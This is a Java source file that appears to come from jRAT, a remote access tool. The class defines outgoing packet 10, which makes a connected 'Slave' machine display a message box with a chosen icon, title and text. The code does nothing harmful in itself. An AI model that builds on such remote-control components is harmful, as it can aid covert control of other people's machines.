package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet10Messagebox implements OutgoingPacket {

	private boolean laf;
	private int icon;
	private String title;
	private String message;

	public Packet10Messagebox(boolean laf, int icon, String title, String message) {
		this.laf = laf;
		this.icon = icon;
		this.title = title;
		this.message = message;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeBoolean(laf);
		slave.writeInt(icon);
		slave.writeLine(title);
		slave.writeLine(message);
	}

	@Override
	public short getPacketId() {
		return 10;
	}

}
